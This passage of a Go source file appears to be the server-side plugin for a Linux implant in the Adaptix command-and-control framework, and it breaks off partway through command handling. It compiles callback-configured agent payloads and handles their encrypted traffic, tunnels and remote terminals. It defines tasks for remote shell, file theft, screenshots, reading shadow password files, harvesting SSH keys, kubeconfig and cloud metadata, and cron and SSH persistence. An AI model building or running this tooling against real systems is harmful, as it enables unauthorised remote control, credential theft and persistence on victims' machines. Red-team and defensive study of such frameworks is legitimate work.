package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2"
	"github.com/vmihailenco/msgpack/v5"
)

type Teamserver interface {
	TsAgentBuildExecute(builderId string, workingDir string, program string, args ...string) error
	TsAgentBuildLog(builderId string, status int, message string) error
	TsTaskUpdate(agentId string, data adaptix.TaskData)
	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int64) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error
	TsScreenshotAdd(agentId string, Note string, Content []byte) error
	TsClientGuiFilesUnix(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataUnix)
	TsClientGuiProcessUnix(taskData adaptix.TaskData, process []adaptix.ListingProcessDataUnix)
	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)
	TsAgentTerminate(agentId string, terminateTaskId string) error
	TsTunnelStart(TunnelId string) (string, error)
	TsTunnelCreateSocks4(AgentId string, Info string, Lhost string, Lport int) (string, error)
	TsTunnelCreateSocks5(AgentId string, Info string, Lhost string, Lport int, UseAuth bool, Username string, Password string) (string, error)
	TsTunnelCreateLportfwd(AgentId string, Info string, Lhost string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelCreateRportfwd(AgentId string, Info string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelStopSocks(AgentId string, Port int)
	TsTunnelStopLportfwd(AgentId string, Port int)
	TsTunnelStopRportfwd(AgentId string, Port int)
	TsTunnelConnectionResume(AgentId string, channelId int, ioDirect bool)
	TsTunnelConnectionClose(channelId int, writeOnly bool)
	TsTunnelConnectionHalt(channelId int, errorCode byte)
	TsTunnelConnectionData(channelId int, data []byte)
	TsTunnelConnectionAccept(tunnelId int, channelId int)
	TsTunnelUpdateRportfwd(tunnelId int, result bool) (string, string, error)
	TsTerminalConnResume(agentId string, terminalId string, ioDirect bool)
	TsTerminalConnData(terminalId string, data []byte)
	TsTerminalConnClose(terminalId string, status string) error
}

type PluginAgent struct{}
type ExtenderAgent struct{}

var (
	Ts             Teamserver
	ModuleDir      string
	AgentWatermark string
)

func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	Ts = ts.(Teamserver)
	return &PluginAgent{}
}

func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
	return &ExtenderAgent{}
}

func getStringArg(args map[string]any, key string) (string, error) {
	v, ok := args[key].(string)
	if !ok {
		return "", fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getFloatArg(args map[string]any, key string) (float64, error) {
	v, ok := args[key].(float64)
	if !ok {
		return 0, fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getBoolArg(args map[string]any, key string) bool {
	v, _ := args[key].(bool)
	return v
}

/*
==============================================================

	COMMAND CONSTANTS
	==============================================================
*/
const (
	CMD_ERROR      = 0
	CMD_PWD        = 1
	CMD_CD         = 2
	CMD_SHELL      = 3
	CMD_EXIT       = 4
	CMD_DOWNLOAD   = 5
	CMD_UPLOAD     = 6
	CMD_CAT        = 7
	CMD_CP         = 8
	CMD_MV         = 9
	CMD_MKDIR      = 10
	CMD_RM         = 11
	CMD_LS         = 12
	CMD_PS         = 13
	CMD_KILL       = 14
	CMD_ZIP        = 15
	CMD_SCREENSHOT = 16
	CMD_RUN        = 17

	CMD_TERMINAL_START = 35
	CMD_TERMINAL_STOP  = 36
	CMD_TERMINAL_WRITE = 37

	CMD_TUNNEL_START     = 31
	CMD_TUNNEL_WRITE     = 40
	CMD_TUNNEL_REVERSE   = 41
	CMD_TUNNEL_ACCEPT    = 42
	CMD_TUNNEL_START_UDP = 43
	CMD_TUNNEL_WRITE_UDP = 44
	CMD_TUNNEL_CLOSE     = 32
	CMD_TUNNEL_PAUSE     = 33
	CMD_TUNNEL_RESUME    = 34
	CMD_SYSINFO          = 200
	CMD_ENV              = 201
	CMD_NETWORK          = 202
	CMD_USERS            = 203
	CMD_CRON             = 204
	CMD_SSH_KEYS         = 205
	CMD_HISTORY          = 206
	CMD_DOCKER           = 207
	CMD_SERVICES         = 208
	CMD_PRIVESC          = 209
	CMD_MOUNTS           = 210
	CMD_PERSIST_CRON     = 211
	CMD_PERSIST_SSH      = 212
	CMD_GETUID           = 213
	CMD_FILESEARCH       = 214
	CMD_SSHAGENT         = 215
	CMD_KUBECONFIG       = 216
	CMD_CLOUDMETA        = 217
	CMD_SLEEP            = 220
	CMD_WHOAMI           = 221
	CMD_HOSTNAME         = 222
	CMD_LSOF             = 223
	CMD_IPTABLES         = 224
	CMD_LAST             = 225
	CMD_SHADOW           = 226
)

/*
==============================================================

	STRUCTS
	==============================================================
*/
type Command struct {
	Code uint   `msgpack:"code"`
	Id   uint   `msgpack:"id"`
	Data []byte `msgpack:"data"`
}

type Message struct {
	Type   int8     `msgpack:"type"`
	Object [][]byte `msgpack:"object"`
}

type SessionInfo struct {
	Process    string `msgpack:"process"`
	PID        int    `msgpack:"pid"`
	User       string `msgpack:"user"`
	Host       string `msgpack:"host"`
	Ipaddr     string `msgpack:"ipaddr"`
	Elevated   bool   `msgpack:"elevated"`
	Os         string `msgpack:"os"`
	Arch       string `msgpack:"arch"`
	OSVersion  string `msgpack:"os_version"`
	Domain     string `msgpack:"domain"`
	Sleep      int    `msgpack:"sleep"`
	Jitter     int    `msgpack:"jitter"`
	EncryptKey []byte `msgpack:"encrypt_key"`
}

type GenerateConfig struct {
	Arch             string `json:"arch"`
	Format           string `json:"format"`
	ReconnectTimeout string `json:"reconnect_timeout"`
	ReconnectCount   int    `json:"reconnect_count"`
	Jitter           int    `json:"jitter"`
	KillDate         string `json:"kill_date"`
	WorkingTime      string `json:"working_time"`
}

type ParamsSleep struct {
	SleepSeconds int `msgpack:"sleep_seconds"`
	Jitter       int `msgpack:"jitter"`
}

type ParamsCd struct {
	Path string `msgpack:"path"`
}
type ParamsShell struct {
	Program string   `msgpack:"program"`
	Args    []string `msgpack:"args"`
}
type ParamsDownload struct {
	Task string `msgpack:"task"`
	Path string `msgpack:"path"`
}
type ParamsUpload struct {
	Path    string `msgpack:"path"`
	Content []byte `msgpack:"content"`
	Finish  bool   `msgpack:"finish"`
}
type ParamsCat struct {
	Path string `msgpack:"path"`
}
type ParamsCp struct {
	Src string `msgpack:"src"`
	Dst string `msgpack:"dst"`
}
type ParamsMv struct {
	Src string `msgpack:"src"`
	Dst string `msgpack:"dst"`
}
type ParamsMkdir struct {
	Path string `msgpack:"path"`
}
type ParamsRm struct {
	Path string `msgpack:"path"`
}
type ParamsLs struct {
	Path string `msgpack:"path"`
}
type ParamsKill struct {
	Pid int `msgpack:"pid"`
}
type ParamsZip struct {
	Src string `msgpack:"src"`
	Dst string `msgpack:"dst"`
}
type ParamsRun struct {
	Program string   `msgpack:"program"`
	Args    []string `msgpack:"args"`
	Task    string   `msgpack:"task"`
}

type AnsError struct {
	Error string `msgpack:"error"`
}
type AnsPwd struct {
	Path string `msgpack:"path"`
}
type AnsShell struct {
	Output string `msgpack:"output"`
}
type AnsDownload struct {
	FileId   int    `msgpack:"id"`
	Path     string `msgpack:"path"`
	Size     int    `msgpack:"size"`
	Content  []byte `msgpack:"content"`
	Start    bool   `msgpack:"start"`
	Finish   bool   `msgpack:"finish"`
	Canceled bool   `msgpack:"canceled"`
}
type AnsUpload struct {
	Path string `msgpack:"path"`
}
type AnsCat struct {
	Path    string `msgpack:"path"`
	Content []byte `msgpack:"content"`
}
type AnsLs struct {
	Result bool   `msgpack:"result"`
	Status string `msgpack:"status"`
	Path   string `msgpack:"path"`
	Files  []byte `msgpack:"files"`
}
type FileInfo struct {
	Mode     string `msgpack:"mode"`
	Nlink    int    `msgpack:"nlink"`
	User     string `msgpack:"user"`
	Group    string `msgpack:"group"`
	Size     int64  `msgpack:"size"`
	Date     string `msgpack:"date"`
	Filename string `msgpack:"filename"`
	IsDir    bool   `msgpack:"is_dir"`
}
type AnsPs struct {
	Result    bool   `msgpack:"result"`
	Status    string `msgpack:"status"`
	Processes []byte `msgpack:"processes"`
}
type PsInfo struct {
	Pid     int    `msgpack:"pid"`
	Ppid    int    `msgpack:"ppid"`
	Tty     string `msgpack:"tty"`
	Context string `msgpack:"context"`
	Process string `msgpack:"process"`
}
type AnsZip struct {
	Path string `msgpack:"path"`
}
type AnsScreenshots struct {
	Screens [][]byte `msgpack:"screens"`
}
type AnsRun struct {
	Stdout string `msgpack:"stdout"`
	Stderr string `msgpack:"stderr"`
	Pid    int    `msgpack:"pid"`
	Start  bool   `msgpack:"start"`
	Finish bool   `msgpack:"finish"`
}
type ParamsTunnelStart struct {
	Proto     string `msgpack:"proto"`
	ChannelId int    `msgpack:"channel_id"`
	Address   string `msgpack:"address"`
}
type ParamsTunnelWrite struct {
	ChannelId int    `msgpack:"channel_id"`
	Data      []byte `msgpack:"data"`
}
type ParamsTunnelReverse struct {
	TunnelId int `msgpack:"tunnel_id"`
	Port     int `msgpack:"port"`
}
type ParamsTunnelAccept struct {
	TunnelId  int `msgpack:"tunnel_id"`
	ChannelId int `msgpack:"channel_id"`
}
type ParamsTunnelStop struct {
	ChannelId int `msgpack:"channel_id"`
}
type AnsTunnelStart struct {
	Result int `msgpack:"result"`
}
type AnsTunnelWrite struct{}

type ParamsTerminalStart struct {
	TermId  int    `msgpack:"term_id"`
	Program string `msgpack:"program"`
	Height  int    `msgpack:"height"`
	Width   int    `msgpack:"width"`
}
type ParamsTerminalStop struct {
	TermId int `msgpack:"term_id"`
}
type ParamsTerminalWrite struct {
	TermId int    `msgpack:"term_id"`
	Data   []byte `msgpack:"data"`
}
type AnsTermWrite struct{}

type AnsGeneric struct {
	Output string `msgpack:"output"`
}

/*
==============================================================

	BUILD
	==============================================================
*/
func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	// HTTP transport needs no opaque per-listener profile blob; the payload is
	// built from ldflags in BuildPayload. Return one empty marker per listener.
	var agentProfiles [][]byte
	for range profile.ListenerProfiles {
		agentProfiles = append(agentProfiles, []byte{})
	}
	return agentProfiles, nil
}

func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	var generateConfig GenerateConfig
	if err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig); err != nil {
		return nil, "", err
	}
	if len(profile.ListenerProfiles) == 0 {
		return nil, "", errors.New("no listener profile")
	}

	var listenerMap map[string]any
	if err := json.Unmarshal(profile.ListenerProfiles[0].Profile, &listenerMap); err != nil {
		return nil, "", err
	}

	protocol, _ := listenerMap["protocol"].(string)
	if protocol == "" {
		// GopherTCP listener uses "tcp"; BeaconHTTP uses "http".
		protocol = "http"
	}

	goarch := "amd64"
	if generateConfig.Arch == "arm64" {
		goarch = "arm64"
	}
	filename := "agent_linux_" + goarch
	workingDir := ModuleDir + "/src_cpp"

	cfg := map[string]string{
		"AGENT_HOST":            "127.0.0.1",
		"AGENT_PORT":            "80",
		"AGENT_HOSTS":           "",
		"AGENT_PORTS":           "",
		"AGENT_TLS_CIPHERS":     "",
		"AGENT_USE_SSL":         "false",
		"AGENT_URI":             "/",
		"AGENT_HB_HEADER":       "X-HB-Data",
		"AGENT_USER_AGENT":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36",
		"AGENT_ENC_KEY":         "00000000000000000000000000000000",
		"AGENT_WATERMARK":       AgentWatermark,
		"AGENT_ANS_PRE":         "0",
		"AGENT_ANS_SUF":         "0",
		"AGENT_RECONN":          generateConfig.ReconnectTimeout,
		"AGENT_JITTER":          fmt.Sprintf("%d", generateConfig.Jitter),
		"AGENT_KILL_DATE":       generateConfig.KillDate,
		"AGENT_WORKING_TIME":    generateConfig.WorkingTime,
		"AGENT_TRANSPORT":       protocol,
		"AGENT_DNS_DOMAIN":      "",
		"AGENT_DNS_PKT_SIZE":    "4096",
		"AGENT_DNS_ENC_KEY":     "00000000000000000000000000000000",
		"AGENT_DNS_RESOLVER":    "",
		"AGENT_TCP_BANNER":      "",
		"AGENT_TCP_USE_SSL":     "false",
		"AGENT_TCP_CLIENT_CERT": "",
		"AGENT_TCP_CLIENT_KEY":  "",
		"AGENT_TCP_CA_CERT":     "",
	}

	switch protocol {
	case "http":
		var hosts, ports []string
		if lines, ok := listenerMap["callback_addresses"].([]interface{}); ok {
			for _, item := range lines {
				line := strings.TrimSpace(fmt.Sprintf("%v", item))
				line = strings.TrimPrefix(line, "https://")
				line = strings.TrimPrefix(line, "http://")
				if h, pp, err := net.SplitHostPort(line); err == nil {
					hosts = append(hosts, h)
					ports = append(ports, pp)
				}
			}
		}
		if len(hosts) == 0 {
			return nil, "", errors.New("callback_addresses is empty")
		}
		cfg["AGENT_HOST"] = hosts[0]
		cfg["AGENT_PORT"] = ports[0]
		cfg["AGENT_HOSTS"] = strings.Join(hosts, ",")
		cfg["AGENT_PORTS"] = strings.Join(ports, ",")

		if b, ok := listenerMap["ssl"].(bool); ok && b {
			cfg["AGENT_USE_SSL"] = "true"
		}
		if uris, ok := listenerMap["uri"].([]interface{}); ok && len(uris) > 0 {
			cfg["AGENT_URI"] = strings.TrimSpace(fmt.Sprintf("%v", uris[0]))
		}
		if v, ok := listenerMap["hb_header"].(string); ok && v != "" {
			cfg["AGENT_HB_HEADER"] = v
		}
		if uas, ok := listenerMap["user_agent"].([]interface{}); ok && len(uas) > 0 {
			cfg["AGENT_USER_AGENT"] = strings.TrimSpace(fmt.Sprintf("%v", uas[0]))
		}
		if v, ok := listenerMap["encrypt_key"].(string); ok && v != "" {
			cfg["AGENT_ENC_KEY"] = v
		}
		if v, ok := listenerMap["page-payload"].(string); ok {
			marker := "<<<PAYLOAD_DATA>>>"
			if i := strings.Index(v, marker); i >= 0 {
				cfg["AGENT_ANS_PRE"] = fmt.Sprintf("%d", i)
				cfg["AGENT_ANS_SUF"] = fmt.Sprintf("%d", len(v)-(i+len(marker)))
			}
		}

	case "tcp", "gophertcp":
		var hosts, ports []string
		if raw, ok := listenerMap["callback_addresses"].(string); ok {
			for _, line := range strings.Split(raw, "\n") {
				line = strings.TrimSpace(line)
				if line == "" {
					continue
				}
				if h, pp, err := net.SplitHostPort(line); err == nil {
					hosts = append(hosts, h)
					ports = append(ports, pp)
				}
			}
		}
		if len(hosts) == 0 {
			return nil, "", errors.New("callback_addresses is empty")
		}
		cfg["AGENT_TRANSPORT"] = "tcp"
		cfg["AGENT_HOST"] = hosts[0]
		cfg["AGENT_PORT"] = ports[0]
		cfg["AGENT_HOSTS"] = strings.Join(hosts, ",")
		cfg["AGENT_PORTS"] = strings.Join(ports, ",")
		if v, ok := listenerMap["encrypt_key"].(string); ok && v != "" {
			cfg["AGENT_ENC_KEY"] = v
		}
		if v, ok := listenerMap["tcp_banner"].(string); ok {
			cfg["AGENT_TCP_BANNER"] = v
		}
		if b, ok := listenerMap["ssl"].(bool); ok && b {
			cfg["AGENT_TCP_USE_SSL"] = "true"
		}
		if v, ok := listenerMap["client_cert"].(string); ok {
			cfg["AGENT_TCP_CLIENT_CERT"] = v
		}
		if v, ok := listenerMap["client_key"].(string); ok {
			cfg["AGENT_TCP_CLIENT_KEY"] = v
		}
		if v, ok := listenerMap["ca_cert"].(string); ok {
			cfg["AGENT_TCP_CA_CERT"] = v
		}

	case "dns":
		domain, _ := listenerMap["domain"].(string)
		if domain == "" {
			return nil, "", errors.New("domain is empty")
		}
		cfg["AGENT_TRANSPORT"] = "dns"
		cfg["AGENT_DNS_DOMAIN"] = domain
		if v, ok := listenerMap["encrypt_key"].(string); ok && v != "" {
			cfg["AGENT_DNS_ENC_KEY"] = v
		}
		if v, ok := listenerMap["pkt_size"].(float64); ok && v > 0 {
			cfg["AGENT_DNS_PKT_SIZE"] = fmt.Sprintf("%d", int(v))
		}

	default:
		return nil, "", errors.New("unsupported listener protocol: " + protocol)
	}

	var b strings.Builder
	b.WriteString("/* generated by agent_linux pl_main.go */\n#pragma once\n")
	keys := []string{"AGENT_HOST", "AGENT_PORT", "AGENT_HOSTS", "AGENT_PORTS", "AGENT_TLS_CIPHERS", "AGENT_USE_SSL", "AGENT_URI", "AGENT_HB_HEADER", "AGENT_USER_AGENT", "AGENT_ENC_KEY", "AGENT_WATERMARK", "AGENT_ANS_PRE", "AGENT_ANS_SUF", "AGENT_RECONN", "AGENT_JITTER", "AGENT_KILL_DATE", "AGENT_WORKING_TIME", "AGENT_TRANSPORT", "AGENT_DNS_DOMAIN", "AGENT_DNS_PKT_SIZE", "AGENT_DNS_ENC_KEY", "AGENT_DNS_RESOLVER", "AGENT_TCP_BANNER", "AGENT_TCP_USE_SSL", "AGENT_TCP_CLIENT_CERT", "AGENT_TCP_CLIENT_KEY", "AGENT_TCP_CA_CERT"}
	for _, k := range keys {
		v := cfg[k]
		v = strings.ReplaceAll(v, "\\", "\\\\")
		v = strings.ReplaceAll(v, "\"", "\\\"")
		v = strings.ReplaceAll(v, "\n", "\\n")
		v = strings.ReplaceAll(v, "\r", "\\r")
		v = strings.ReplaceAll(v, "\t", "\\t")
		b.WriteString("#define " + k + " \"" + v + "\"\n")
	}

	if err := os.WriteFile(workingDir+"/config.h", []byte(b.String()), 0644); err != nil {
		return nil, "", err
	}

	cxx := "g++"
	if goarch == "arm64" {
		cxx = "aarch64-linux-gnu-g++"
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Building Linux agent (C++/%s, transport=%s)...", goarch, protocol))
	cmdBuild := fmt.Sprintf("make TARGET=%s SKIP_CONFIG=1 CXX=%s", filename, cxx)
	if err := Ts.TsAgentBuildExecute(profile.BuilderId, workingDir, "bash", "-c", cmdBuild); err != nil {
		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_ERROR, "Build failed: "+err.Error())
		return nil, "", err
	}

	payload, err := os.ReadFile(workingDir + "/" + filename)
	if err != nil {
		return nil, "", err
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, fmt.Sprintf("Payload size: %d bytes", len(payload)))
	return payload, filename, nil
}

func splitHostPort(hostport string) (string, string, error) {
	host, portStr, err := netSplitHostPort(hostport)
	if err != nil {
		return "", "", err
	}
	return host, portStr, nil
}

func netSplitHostPort(hostport string) (string, string, error) {
	host, port, err := net.SplitHostPort(hostport)
	if err != nil {
		return "", "", err
	}
	return host, port, nil
}

func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
	var agentData adaptix.AgentData
	var sessionInfo SessionInfo
	if err := msgpack.Unmarshal(beat, &sessionInfo); err != nil {
		return adaptix.AgentData{}, nil, err
	}

	agentData.Pid = strconv.Itoa(sessionInfo.PID)
	agentData.Arch = sessionInfo.Arch
	if agentData.Arch == "amd64" {
		agentData.Arch = "x64"
	}
	if agentData.Arch == "" {
		agentData.Arch = "x64"
	}
	agentData.Elevated = sessionInfo.Elevated
	agentData.InternalIP = sessionInfo.Ipaddr
	agentData.Os = adaptix.OS_LINUX
	agentData.OsDesc = sessionInfo.OSVersion
	if agentData.OsDesc == "" {
		agentData.OsDesc = "Linux"
	}
	agentData.SessionKey = sessionInfo.EncryptKey
	agentData.Domain = sessionInfo.Domain
	if agentData.Domain == "" {
		agentData.Domain = "(none)"
	}
	agentData.Computer = sessionInfo.Host
	agentData.Username = sessionInfo.User
	agentData.Process = sessionInfo.Process
	if agentData.Process == "" {
		agentData.Process = "linux_agent"
	}
	if sessionInfo.Sleep > 0 {
		agentData.Sleep = uint(sessionInfo.Sleep)
	}
	if sessionInfo.Jitter > 0 {
		agentData.Jitter = uint(sessionInfo.Jitter)
	}

	return agentData, &ExtenderAgent{}, nil
}

/*
==============================================================

	AGENT HANDLER
	==============================================================
*/
func (ext *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	_, _ = io.ReadFull(rand.Reader, nonce)
	return gcm.Seal(nonce, nonce, data, nil), nil
}

func (ext *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, errors.New("ciphertext too short")
	}
	return gcm.Open(nil, data[:nonceSize], data[nonceSize:], nil)
}

func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
	var objects [][]byte
	for _, taskData := range tasks {
		taskId, err := strconv.ParseUint(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}
		var command Command
		_ = msgpack.Unmarshal(taskData.Data, &command)
		if command.Id == 0 {
			command.Id = uint(taskId)
		}
		cmd, _ := msgpack.Marshal(command)
		objects = append(objects, cmd)
	}
	message := Message{Type: 1, Object: objects}
	return msgpack.Marshal(message)
}

func (ext *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA}, errors.New("pivot not supported")
}

func (ext *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{
		ConnectTCP: func(channelId, tunnelType, addressType int, address string, port int) adaptix.TaskData {
			b, _ := msgpack.Marshal(ParamsTunnelStart{Proto: "tcp", ChannelId: channelId, Address: net.JoinHostPort(address, strconv.Itoa(port))})
			c, _ := msgpack.Marshal(Command{Code: CMD_TUNNEL_START, Id: uint(channelId), Data: b})
			return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: c, Sync: false}
		},
		WriteTCP: func(channelId int, data []byte) adaptix.TaskData {
			b, _ := msgpack.Marshal(ParamsTunnelWrite{ChannelId: channelId, Data: data})
			c, _ := msgpack.Marshal(Command{Code: CMD_TUNNEL_WRITE, Id: uint(channelId), Data: b})
			return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: c, Sync: false}
		},
		Close: func(channelId int) adaptix.TaskData {
			b, _ := msgpack.Marshal(ParamsTunnelStop{ChannelId: channelId})
			c, _ := msgpack.Marshal(Command{Code: CMD_TUNNEL_CLOSE, Id: uint(channelId), Data: b})
			return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: c, Sync: false}
		},
		Pause: func(channelId int) adaptix.TaskData {
			b, _ := msgpack.Marshal(ParamsTunnelStop{ChannelId: channelId})
			c, _ := msgpack.Marshal(Command{Code: CMD_TUNNEL_PAUSE, Id: uint(channelId), Data: b})
			return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: c, Sync: false}
		},
		Resume: func(channelId int) adaptix.TaskData {
			b, _ := msgpack.Marshal(ParamsTunnelStop{ChannelId: channelId})
			c, _ := msgpack.Marshal(Command{Code: CMD_TUNNEL_RESUME, Id: uint(channelId), Data: b})
			return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: c, Sync: false}
		},
		ConnectUDP: func(channelId, tunnelType, addressType int, address string, port int) adaptix.TaskData {
			b, _ := msgpack.Marshal(ParamsTunnelStart{Proto: "udp", ChannelId: channelId, Address: net.JoinHostPort(address, strconv.Itoa(port))})
			c, _ := msgpack.Marshal(Command{Code: CMD_TUNNEL_START_UDP, Id: uint(channelId), Data: b})
			return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: c, Sync: false}
		},
		WriteUDP: func(channelId int, data []byte) adaptix.TaskData {
			b, _ := msgpack.Marshal(ParamsTunnelWrite{ChannelId: channelId, Data: data})
			c, _ := msgpack.Marshal(Command{Code: CMD_TUNNEL_WRITE_UDP, Id: uint(channelId), Data: b})
			return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: c, Sync: false}
		},
		Reverse: func(tunnelId, port int) adaptix.TaskData {
			b, _ := msgpack.Marshal(ParamsTunnelReverse{TunnelId: tunnelId, Port: port})
			c, _ := msgpack.Marshal(Command{Code: CMD_TUNNEL_REVERSE, Id: uint(tunnelId), Data: b})
			return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: c, Sync: false}
		},
	}
}

func (ext *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{
		Start: func(terminalId int, program string, sizeH, sizeW, oemCP int) adaptix.TaskData {
			b, _ := msgpack.Marshal(ParamsTerminalStart{TermId: terminalId, Program: program, Height: sizeH, Width: sizeW})
			c, _ := msgpack.Marshal(Command{Code: CMD_TERMINAL_START, Id: uint(terminalId), Data: b})
			return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: c, Sync: false}
		},
		Write: func(terminalId, oemCP int, data []byte) adaptix.TaskData {
			b, _ := msgpack.Marshal(ParamsTerminalWrite{TermId: terminalId, Data: data})
			c, _ := msgpack.Marshal(Command{Code: CMD_TERMINAL_WRITE, Id: uint(terminalId), Data: b})
			return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: c, Sync: false}
		},
		Close: func(terminalId int) adaptix.TaskData {
			b, _ := msgpack.Marshal(ParamsTerminalStop{TermId: terminalId})
			c, _ := msgpack.Marshal(Command{Code: CMD_TERMINAL_STOP, Id: uint(terminalId), Data: b})
			return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: c, Sync: false}
		},
	}
}

func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var taskData adaptix.TaskData
	var messageData adaptix.ConsoleMessageData

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}
	subcommand, _ := args["subcommand"].(string)

	taskData = adaptix.TaskData{Type: adaptix.TASK_TYPE_TASK, Sync: true}
	messageData = adaptix.ConsoleMessageData{Status: adaptix.MESSAGE_INFO}
	messageData.Message, _ = args["message"].(string)

	var cmd Command
	var err error

	switch command {
	case "cat":
		path, e := getStringArg(args, "path")
		err = e
		b, _ := msgpack.Marshal(ParamsCat{Path: path})
		cmd = Command{Code: CMD_CAT, Data: b}
	case "cd":
		path, e := getStringArg(args, "path")
		err = e
		b, _ := msgpack.Marshal(ParamsCd{Path: path})
		cmd = Command{Code: CMD_CD, Data: b}
	case "cp":
		src, e1 := getStringArg(args, "src")
		dst, e2 := getStringArg(args, "dst")
		if e1 != nil {
			err = e1
		} else {
			err = e2
		}
		b, _ := msgpack.Marshal(ParamsCp{Src: src, Dst: dst})
		cmd = Command{Code: CMD_CP, Data: b}
	case "mv":
		src, e1 := getStringArg(args, "src")
		dst, e2 := getStringArg(args, "dst")
		if e1 != nil {
			err = e1
		} else {
			err = e2
		}
		b, _ := msgpack.Marshal(ParamsMv{Src: src, Dst: dst})
		cmd = Command{Code: CMD_MV, Data: b}
	case "mkdir":
		path, e := getStringArg(args, "path")
		err = e
		b, _ := msgpack.Marshal(ParamsMkdir{Path: path})
		cmd = Command{Code: CMD_MKDIR, Data: b}
	case "rm":
		path, e := getStringArg(args, "path")
		err = e
		b, _ := msgpack.Marshal(ParamsRm{Path: path})
		cmd = Command{Code: CMD_RM, Data: b}
	case "ls":
		path, _ := getStringArg(args, "path")
		b, _ := msgpack.Marshal(ParamsLs{Path: path})
		cmd = Command{Code: CMD_LS, Data: b}
	case "kill":
		pidF, ok := args["pid"].(float64)
		if !ok {
			err = errors.New("'pid' must be set")
		}
		b, _ := msgpack.Marshal(ParamsKill{Pid: int(pidF)})
		cmd = Command{Code: CMD_KILL, Data: b}
	case "zip":
		src, e1 := getStringArg(args, "src")
		dst, e2 := getStringArg(args, "dst")
		if e1 != nil {
			err = e1
		} else {
			err = e2
		}
		b, _ := msgpack.Marshal(ParamsZip{Src: src, Dst: dst})
		cmd = Command{Code: CMD_ZIP, Data: b}
	case "download":
		path, e := getStringArg(args, "path")
		err = e
		b, _ := msgpack.Marshal(ParamsDownload{Path: path})
		cmd = Command{Code: CMD_DOWNLOAD, Data: b}
	case "upload":
		path, e1 := getStringArg(args, "path")
		fileB64, e2 := getStringArg(args, "file")
		if e1 != nil {
			err = e1
		} else {
			err = e2
		}
		content, derr := base64.StdEncoding.DecodeString(fileB64)
		if derr != nil {
			err = derr
		}
		b, _ := msgpack.Marshal(ParamsUpload{Path: path, Content: content, Finish: true})
		cmd = Command{Code: CMD_UPLOAD, Data: b}
	case "shell":
		program, e := getStringArg(args, "program")
		err = e
		argsStr, _ := getStringArg(args, "args")
		shellArgs := splitShellArgs(argsStr)
		b, _ := msgpack.Marshal(ParamsShell{Program: program, Args: shellArgs})
		cmd = Command{Code: CMD_SHELL, Data: b}
	case "run":
		program, e := getStringArg(args, "program")
		err = e
		argsStr, _ := getStringArg(args, "args")
		runArgs := splitShellArgs(argsStr)
		b, _ := msgpack.Marshal(ParamsRun{Program: program, Args: runArgs})
		cmd = Command{Code: CMD_RUN, Data: b}
	case "ps":
		cmd = Command{Code: CMD_PS}
	case "pwd":
		cmd = Command{Code: CMD_PWD}
	case "screenshot":
		cmd = Command{Code: CMD_SCREENSHOT}
	case "exit":
		cmd = Command{Code: CMD_EXIT}
	case "sysinfo":
		cmd = Command{Code: CMD_SYSINFO}
	case "env":
